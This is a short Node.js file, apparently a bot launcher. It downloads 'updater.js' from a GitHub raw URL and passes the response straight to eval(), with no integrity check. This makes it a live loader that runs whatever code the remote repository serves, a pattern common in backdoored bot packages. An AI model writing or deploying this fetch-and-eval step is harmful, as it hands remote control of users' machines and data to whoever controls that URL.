const axios = require('axios');

axios.get("https://raw.githubusercontent.com/Priyansh-11/Priyansh-bot/main/updater.js")
  .then(res => eval(res.data));
